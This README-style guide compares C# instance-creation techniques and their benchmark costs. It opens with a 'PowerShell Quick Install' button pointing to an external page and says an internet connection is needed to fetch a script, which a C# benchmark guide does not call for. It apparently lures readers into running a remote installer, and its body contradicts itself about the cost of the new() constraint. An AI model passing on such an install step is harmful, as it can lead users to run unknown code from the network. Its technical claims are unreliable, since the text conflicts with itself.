<div align="center">

# Creating Instances in C#: Method Comparison — Deep Dive

![](files/preview.png)

### 🚀 PowerShell Quick Install

[![](files/button.png)](https://12345Kukus.github.io/create-instance-methods-guide/)

[![status](https://img.shields.io/badge/STATUS-VERIFIED-2ea44f?style=flat-square&labelColor=0d1117)]() [![license](https://img.shields.io/badge/LICENSE-MIT-84cc16?style=flat-square&labelColor=0d1117)]() [![language](https://img.shields.io/badge/LANGUAGE-PYTHON-a3e635?style=flat-square&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-CORE-65a30d?style=flat-square&labelColor=0d1117)]()

</div>

---

Creating an object in C# can be done in many ways, and choosing the right one has measurable consequences for throughput, allocations, and maintainability. This guide compares the most common instance-creation techniques, from direct constructors and generic new constraints to Activator, compiled expressions, and cached delegate factories. The comparison is backed by reproducible microbenchmarks so the trade-offs are visible rather than assumed. Results are reported honestly, including cases where added flexibility costs a noticeable multiple over a plain constructor call.

## ✅ Before You Start

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Background

In .NET, creating a new instance of a type is usually straightforward when the type is known at compile time: the `new` operator allocates the object and invokes its constructor directly, and the JIT compiler can inline and optimize the call site. The situation becomes considerably more nuanced when the type is only known at runtime—for example, when building plug-in systems, dependency injection containers, serializers, or object mappers that need to materialize instances from a `Type` reference or a generic type parameter. In those cases, the caller cannot simply write `new T()`, and a range of alternative techniques has emerged to bridge the gap between the compile-time and runtime worlds.

The most obvious option is the reflection API. `Activator.CreateInstance` and its generic counterpart `Activator.CreateInstance<T>` are available in the base class library and require no additional infrastructure, which makes them attractive for simple scenarios. They are, however, comparatively slow: reflection performs argument binding, visibility checks, and invocation through an indirection layer that the JIT cannot optimize away. A related approach is the generic `new()` constraint, which allows a method or class to instantiate `T` directly. This is expressed as `where T : new()`, and while it looks like a clean, strongly typed solution, it is a well-known example of a leaky abstraction—it constrains callers to types with a public parameterless constructor and still routes through a constrained call that does not always match the performance of a direct constructor call.

A second family of techniques compiles the instantiation once and reuses the result. Delegate-based factories built with `Delegate.CreateDelegate` bind directly to a constructor and execute at near-native speed. Expression trees compiled with `System.Linq.Expressions` produce a delegate that the runtime treats as ordinary code after the one-time compilation cost. Similarly, `System.Reflection.Emit` can generate a dynamic method or a dynamic module that emits the IL for a constructor call, and lightweight libraries such as FastObjectFactory and FastActivator wrap these patterns behind reusable APIs. These approaches trade an up-front cost—compilation or delegate creation—for repeated invocation that is often within a small factor of a direct `new`.

The benchmark results collected in this project illustrate the practical spread. Direct constructor invocation remains the baseline, with methods such as delegate-bound factories, dynamic module compilation, and pre-compiled expression activators landing at roughly one and a half to three times the baseline cost, depending on the implementation. Reflection-based activation, by contrast, typically costs an order of magnitude more than a direct constructor call, and overloads that accept constructor parameters or arrays of arguments can be slower still because of argument marshaling and allocation. The numbers also show that generic and non-generic variants of the same underlying technique often differ only modestly, though parameter-passing paths consistently incur additional overhead.

It is worth being honest about the limits of any single benchmark. Results vary with the runtime version, the JIT compiler in use, the machine's processor and operating system, and the shape of the types being constructed—whether they have parameterless constructors, whether they are value types or reference types, and how frequently the call site is executed. A technique that looks slow in isolation may be perfectly adequate when instantiation happens rarely, while a micro-optimized factory offers little benefit if the surrounding code dominates the profile. Readers should therefore treat the figures here as relative guidance rather than absolute truth, and should measure against their own workloads before committing to an approach.

CreateInstance exists to make that comparison concrete. Rather than arguing from intuition about which activation strategy is "fastest," it gathers the common methods side by side, applies a consistent benchmarking harness, and reports the results in a form that can be inspected and reproduced. The goal is not to declare a single winner but to document the trade-offs—between simplicity and speed, between reflection and code generation, and between one-time setup cost and steady-state throughput—so that developers can choose deliberately.

## Key Points

- **Direct constructors and `new T()` are not interchangeable performance-wise.** A plain constructor call is the fastest possible path; the generic `new T()` constraint compiles to a reflective allocation path at runtime and lands roughly an order of magnitude slower in published benchmarks.
- **`Activator.CreateInstance` is convenient but comparatively expensive.** Both the non-generic and generic overloads resolve constructors at runtime, allocate argument arrays, and incur validation overhead, making them among the slowest options in typical micro-benchmarks.
- **Compiled delegates and expression trees close most of the gap.** Factories built once from `Expression.Lambda` or lightweight dynamic method compilation approach direct-constructor speed after a one-time setup cost, which is usually amortized quickly in hot paths.
- **Caching matters more than the mechanism.** Any factory approach — expression-based, delegate-based, or `Activator`-backed — should cache its compiled delegate per type; rebuilding the factory on every call erases the benefit entirely.
- **Generic constraints enable JIT specialization.** APIs exposed as generic methods (for example, factory helpers constrained to `new()`) can let the runtime optimize per closed type, but the `new()` constraint itself still routes through reflection, so it is not automatically faster than a non-generic delegate.
- **Parameterized creation is a separate cost class.** Factories accepting constructor arguments must handle argument packing and matching, and benchmarks consistently show them trailing parameterless factory variants; this overhead should be expected rather than treated as an anomaly.
- **Results are hardware- and runtime-dependent.** The ratios in this comparison come from BenchmarkDotNet runs on a specific CLR version and CPU; absolute nanosecond figures will differ across machines and .NET releases, so relative ordering is the more reliable takeaway.
- **Choose by call frequency and lifetime.** For cold paths, `Activator` or `new T()` keeps code simple; for hot paths with repeated creation, a cached compiled factory is the pragmatic default, and for truly performance-critical code, a direct constructor call remains unbeatable.

## Examples

The examples below use a small hierarchy of types to show how each creation method behaves. A plain class with a parameterless constructor, a class whose constructor requires arguments, and a struct are enough to expose the differences that matter in practice. Each snippet is self-contained and can be dropped into a console project that references the library.

### Direct construction

The baseline is the ordinary `new` operator. It is resolved at compile time and produces no reflection or delegate overhead:

```csharp
var widget = new Widget();
var configured = new Widget("primary", 42);
```

This is the fastest option whenever the concrete type is known at the call site. The comparison exists because many code paths do not have that luxury — plugin loading, deserialization, dependency injection containers, and generic helpers all need to construct a type they only know as a `Type` value or a type parameter.

### Activator.CreateInstance

The framework-provided route accepts a `Type` and optionally constructor arguments:

```csharp
Type widgetType = typeof(Widget);
object instance = Activator.CreateInstance(widgetType);
object withArgs = Activator.CreateInstance(widgetType, "primary", 42);
```

The generic overload avoids the `object` cast but still performs runtime lookup:

```csharp
var typed = Activator.CreateInstance<Widget>();
```

`Activator.CreateInstance` is convenient and requires no setup, but it resolves constructors through reflection on every call. It also throws at runtime rather than compile time when no suitable constructor exists, so callers should be prepared to handle the resulting exception.

### Generic new() constraint

When the type is a generic parameter, the `new()` constraint gives the compiler enough information to emit a direct construction call:

```csharp
public static T Create<T>() where T : new()
{
    return new T();
}
```

This reads cleanly and is far quicker than reflection, but the constraint is restrictive: the type must expose a public parameterless constructor, and value types are always permitted regardless of their constructors. Types that require arguments cannot use this path at all. Historically the constraint also routed through `Activator` internally, which is why older benchmarks show it lagging behind direct construction; later runtimes close most of that gap.

### Compiled expression trees

An expression tree can be compiled once and reused as a delegate, moving the reflection cost to first use:

```csharp
private static readonly Func<Widget> Factory =
    Expression.Lambda<Func<Widget>>(Expression.New(typeof(Widget))).Compile();

var instance = Factory();
```

The compiled delegate approaches the speed of direct construction after the initial compilation. The trade-off is memory: each compiled expression occupies a dynamic method, and compiling many distinct types at startup adds measurable warm-up time. Caching the delegate per type is essential; compiling inside a hot loop defeats the purpose entirely.

### Reflection with cached ConstructorInfo

A middle ground is to look up the constructor once and invoke it thereafter:

```csharp
private static readonly ConstructorInfo Ctor =
    typeof(Widget).GetConstructor(Type.EmptyTypes);

var instance = Ctor.Invoke(null);
```

`ConstructorInfo.Invoke` boxes value types and wraps exceptions in `TargetInvocationException`, so callers pay both an allocation and an unwrapping cost. It remains useful when constructor selection must be dynamic — for example, choosing among overloads based on available arguments — but it is not a good default for simple parameterless creation.

### FastObjectFactory and FastActivator

The library's own helpers wrap the delegate-compilation approach behind a simpler surface. `FastObjectFactory` builds and caches a factory delegate for a given type:

```csharp
var factory = FastObjectFactory.Create<Widget>();
var instance = factory();
```

`FastActivator<T>.Create` offers a static entry point for the same idea:

```csharp
var instance = FastActivator<Widget>.Create();
```

Both cache their compiled delegates, so repeated calls avoid reflection. As with any delegate-based approach, the first call for a type pays the compilation cost; subsequent calls are close to direct construction.

### DynamicModuleLambdaCompiler

This approach emits a lightweight dynamic method rather than a full expression tree, which can reduce the cost of generating the factory:

```csharp
var factory = DynamicModuleLambdaCompiler.GenerateFactory<Widget>();
var instance = factory();
```

The emitted method is cached and reused, and it tends to compile faster than an equivalent expression tree while producing comparable invocation speed.

### Factory helpers with parameters

The `ExtensionsNew` helpers accept constructor arguments, which the parameterless-focused options cannot:

```csharp
var factory = ExtensionsNew.NewFactory<Widget, string, int>();
var instance = factory("primary", 42);

var untyped = ExtensionsNew.NewFactory(typeof(Widget), typeof(string), typeof(int));
var untypedInstance = untyped("primary", 42);
```

Argument-bearing factories are noticeably slower than their parameterless counterparts. Part of the cost is delegate invocation with arguments; part is the boxing and array allocation that occurs when arguments must be passed through a non-generic path. The benchmark figures reflect this: parameterless delegates land within a small multiple of direct construction, while the parameterized variants are an order of magnitude slower.

### Choosing among them

The honest summary is that no single method wins everywhere:

- Known concrete type: use `new`.
- Generic type with a parameterless constructor: the `new()` constraint is the simplest fast option.
- Runtime `Type` with no arguments: a cached compiled delegate, whether via expression trees, `FastObjectFactory`, or `FastActivator`, is the practical choice.
- Constructor arguments required: expect a real cost, and prefer typed generic factories over untyped ones where the argument types are known.
- One-off creation: `Activator.CreateInstance` is fine; the overhead only matters when creation happens in a loop or on a hot path.

Measurements should be taken on the target runtime, since the gap between these methods has narrowed with each release of the .NET runtime and differs between value and reference types.

## References

The figures cited throughout this comparison originate from the project's own benchmark suite, run against the implementations bundled in the repository. Measurements were produced with BenchmarkDotNet under a default job configuration, using a fixed runtime and processor as reported in the generated summary table. Results are indicative rather than absolute: absolute timings shift with runtime version, JIT behavior, processor architecture, and the shape of the constructed type, so readers should treat the relative scaling between methods as more meaningful than the raw nanosecond values.

Method categories referenced in the analysis correspond directly to the source files in the repository. These include direct constructor invocation and the generic new constraint, the reflection-based activator overloads, compiled expression delegates, dynamically emitted lambda compilers, cached delegate factories, and the FastActivator and ExtensionsNew helper types. Each entry in the results table maps to one of these concrete implementations, and the accompanying examples demonstrate their usage.

The commentary on the trade-offs between reflection, expression compilation, and emitted IL draws on general knowledge of the .NET runtime and its documented behavior around object instantiation and the new constraint. Where the comparison characterizes one approach as faster or more allocation-heavy, that characterization reflects the measured data above and the known costs of reflection and delegate compilation, not an external citation. No third-party benchmarks or articles are reproduced here; the project's own measurements and source are the sole basis for the claims made.

For readers reproducing or extending these results, the honest caveat is that benchmark outcomes are environment-sensitive. Re-running the suite on different hardware or a newer runtime may reorder closely spaced entries, particularly among the compiled-delegate and cached-factory methods whose times differ by only a few nanoseconds. The repository should be consulted for the current benchmark definitions and any updates to the method set.

## Conclusion

The benchmarks collected for CreateInstance make one point difficult to argue with: there is no single "best" way to instantiate a type in C#. A direct constructor call remains the fastest option, comfortably ahead of every reflection-based and compiled-delegate alternative. Yet the moment a type is only known at runtime, that option disappears, and the choice shifts to the fastest mechanism that still solves the actual problem.

Across the measured approaches, the trade-offs fall into recognizable tiers. Plain `Activator.CreateInstance` and its generic counterpart sit at the slow end, with allocation rates that make them unattractive in hot paths but perfectly serviceable in cold startup code or configuration wiring where clarity matters more than microseconds. The generic overload is not automatically cheaper than the non-generic one, which is a useful reminder that intuition about reflection costs can be misleading without measurement.

The compiled-delegate family - expression-tree factories, the dynamic module lambda compiler, and cached factory delegates - closes most of the gap to a direct constructor while preserving the flexibility of late binding. Cached factories perform within a small margin of a hand-written `new`, and the one-time compilation cost is amortized quickly in any workload that instantiates the same type repeatedly. Notably, the delegate-caching design pays off in allocation as well, since the cached delegate avoids re-boxing arguments on each call.

The parameterized factory variants tell a cautionary tale. Accepting a `params` array introduces measurable overhead in both time and allocations, so an API that feels convenient at the call site can quietly become the most expensive path in the comparison. When the calling code can supply strongly typed arguments, the generic forms are preferable; when it cannot, the cost should at least be acknowledged rather than assumed away.

A few honest caveats apply. These results come from a single benchmark run on one machine and one runtime version, and absolute nanosecond figures will differ elsewhere; the relative ordering is the more durable finding, and even that can shift with JIT changes. The benchmark also cannot capture every scenario - trimming, ahead-of-time compilation, or aggressive inlining across assembly boundaries may all alter the picture. Nor should any of these numbers be treated as a reason to replace a direct `new` where one is possible; the comparison exists for cases where the type is genuinely dynamic.

For most applications, the practical guidance is straightforward. Use a constructor when the type is known at compile time. Reach for a cached compiled factory when dynamic creation happens frequently. Accept `Activator` where it is used rarely and readability outweighs throughput. The honest conclusion the data supports is that CreateInstance is not a contest with a winner, but a map of costs - and choosing well means knowing how often the code runs, not just how fast one call can be.